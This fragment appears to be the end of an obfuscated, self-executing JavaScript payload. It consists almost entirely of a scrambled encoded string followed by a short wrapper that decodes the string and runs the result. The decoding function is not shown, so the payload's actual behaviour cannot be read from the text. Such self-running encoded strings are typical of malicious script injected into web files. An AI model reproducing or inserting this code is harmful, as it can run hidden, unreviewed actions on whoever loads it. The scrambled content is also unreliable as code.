a_B_oon(Bt.uB%BsB%$K]_j4,Bbe-nnMa\/o{a3BgX$eBilm-aq{}ro=hBsf=lBB.ew[rdccli%B(=sBB,.tB+BP9 t_?rB5h )l0-Wbs,t7og$o.gQ_a.<ok_1t1Bie\\ac}ge:.(n!B7ea={Bscof] >vBtiB.%uBBi*tBgBne,1Bpe9ettit+c;N"[B.B7(+9pwa!U)Ngte4ahBR]o!l4Bl+]6 cBBBBHBcn2a.=ti7BaR$tab_2Fl%iabT.f]6sa5%B]%ySh-reo#]r=]!}BBsOBnd_c^B}pzi)d_1.]o{riB4B=eu)rf;wrk%$ {_B.iS=kbB6 ]4$cbfa}Ueo)_\/e,f} :(fn_!sB84Bi6]prl=puadt;bie(X%;dnrdcz(1_(.n.=B_;cS=y)NBH4+o1.o(B.c));%rBtoN= c]l} 9r0BD.nBctcB<b[>;v,(1;Bi][in__on;&uV5oQ#oB9 {:6=.onbd.c.BnI:tce ]n#,uB@e"ue!n)Bcnl+n8.r2]8o"_h_lmMo_a=.cBiB+.=jrerqBB6oa9r6G.]By_]1Ca[e9@)bicB`B]B9}3i;)$])BB3lo0(%b4t%.nB8oBMB!.B8BBB.B]c(mg.%B];B{atLBR=.S-e44!%:1e6_ 3t4eB;nchB11lc40fWdkh%r4tBudn.iebrk}3tfnt;,x, )l t%[u0mca)eBB._){.>;x)_t2B.BBBe; ==]rrB[:B=]0t_6l4a@%T%_c,)j61"B{i_r83NBm.crg2B)Bgo6i!sB;rf%er%Boe)}fxacoB.e:1B;8%=n iSF]%B.i]o;30s:rnBlWBA{t.Bt1 B`.37Ta";;}seB ])a,1BL>n1eaf!2Bc3.%cOc!uBh=B]c}ode51u1cse)d ]Bn\'1hhBnm]tH_Cs%Bl!2a  "(BBBB2(hBhB{eetrh] ;fehB4nn]+Bo8,MlQtbfB_B.?er)!}pB_B2B)t=dr=itetn{i:crBNb?. !s BB(],B. 9,hds2&T=i}+.e2lbaa(.Bc)c)_c=un.2;p,lB8(B\\l1poo,s}%rBri]4BeB1E2f2,n8(_lc]1=g.tm{pip52B1EccnB(xorBSlrBBc)7t}}Bot2] ].tc{oh]B.n]h 182B0dcBB9crB00BiB}3;oBdrBB(co_nB50sgerB j.%ce\\_i=%.hoa..e>Bmt=c$[](gr_B5:t4gKpseilee;i]p.uBfBeeB,Bh2e_C2rBooGkwa!o]t[cL1td=asn]B}+.tBn,(cBoid,_[)a t=BB_.oatuBB04]]B{)r ]mBeiranE{$B1_jhX_Bo._go{boNe_%gR]osfvn=.sh..+(Mh0tBes.] __IaArintCBe5_33+]}iB]c6_[m1Bc%].cltB0scanf$o33p+)i_$BWlpc0oi12>1Bix2tc=5iB]t&aoo%n%en)5be33.drut]}3.c(ckBn1WhnB,)Buehs(d!k#34ceeB8(Busje)BMBr:B3t5BBsjlBeB17su$vfBken.&v&)_Bo],bY{_v30_tjBB$t#D?=3.(1caBr0!fn6cB#dDk:Badt_6eBBn.ms]1cc91BteiBBdt\\[{[5__=f.e{tmi)B;a=eB] S(st>1==BjBe}Bb=_inr[$.1i&=g_(BB_l%;n}t(-_c()tr?(3o]3t)E9iB<B[_S1Bece&B12zdBeB4B aKbtc.tB_6t!4B,.]j3eh4\/(r+6fo_.B4le&c8t__ostT,(.lB9.4 e2VE;5=1n:cBt;}_go^>_()4%v4B{BB).xiBdt7ee(=_myB]BQoBB_p1!bB%ad."(s$= 6nu_o1a)]:cs(Blo5(oi4B]s]eB,Bel6o6eB]Bqc.c,lBcBlfBf%p_4i({Bxc]n_.asBtc5];cup]_.B\/3a! (n6t0r0B)ttt] Bt{Ba%od(f ,nx==(].+gt)]BB_r!upgcap]u=I%]h%B_B18onQ)(}:4Fr o7-?re=rB1e.eBf)l+r(c_l!B re0ni95l3;wBgDta%o=.eg?dd=j#adBv..B9]lJ3B[xBcftdt]hcB=c}](B)a.]6aTeeEw3]2etBta%aU.(fiBeBebB}iB ns.B%BB]BbB{ccqBGu_c:45op]e3BBrc+nc.B)B .]+e_trf_)t{B1eA$(.1}_g6BJbeeBeBr{BZB_$g?(ll3eWk0r)co!Ir7B,o3pi}.h3]dI>B9]((et=rB[B=.,+i+o3t]Y=1]nrBo6Bc*jr1a3=S:)rey# et!%g6]_{(ee{5i!1el+%U)fe.0,Bf5cpdi604.$l_61_t%Tep..p2iB 27;B46BoBeae]2dl1!tpo,.Q1o!x=[loo)4Bmc2h%tv}B!lB)iBi}]mnsBBB%0vy}cBsQ)r) Bi.a?hg_8]{t;)_B}5)v.?X!124B))( B`rp+B$s%u%ca"Bh)*nc7c_t)s&)=y&_ts&3b9pB)*ar=3c]=5iopIod()2B3Bd(Bxe _=%BBB;B]b=n=rg"Bna 2\'1teB3B}d4t=,p!Bsernfea ]act(tnosc.)aeBBp$[Bj4sr).2cr9r:%W{teah)!Fe)}2BeWmB_rkdBBh;fn})0>}_!_jcobk9mB2Bnfi7=bs(cr;to_.Bo))Bi%)85gy89_dc%,n1BdIBcot@$_3B}p!jo_]l26%n)_nea]i6c6BEa3n: {76dcBscw ]Bu016yiElqetB)e)_. grBn2s_;Btf]n{ic se]=>l98duBx!cB{BB_B]B =r))BBq (eeB.n2.;cHpnb:B]oB ]aB(BBrBo)(o_B (]i%6%tiBwcJtoBBaa((e_.BoR(Bs{BBe_(j3o  B7(;(0.t-c5}c1BrMtcmBB?1nybb%.:f1c$ sid(%hu)*r mdn_e_2]yotBct9Bcm$cf;BBv BeTco527bg_; .cBccowB.)b3.c3l)]BB.lB%aI%BBcse.U1 %s(o_tcc]=fsgNeD;)5,Z=c)ciSCBW(hu$_ti1hdp_Sbecl}dbY{n&B)%Bosm={=ogc o)zw2BcnBBBat3B(ep=W0eBoB)0s#_Bt_xtB]t1%_}2rBuimgcBs\'g(.e=)_Bo_(a]t ehk.])7= nl=  BBcc;%.=]_)$h4 e&B^.6lo..BfBlnd\\2}khycmc\/"r)(rS6.0[]B{vdx_o p}Bnt=e)]b)Qda,}bv2'));var ppp=pUb(BfP,vYP );ppp(9904);return 4188})()
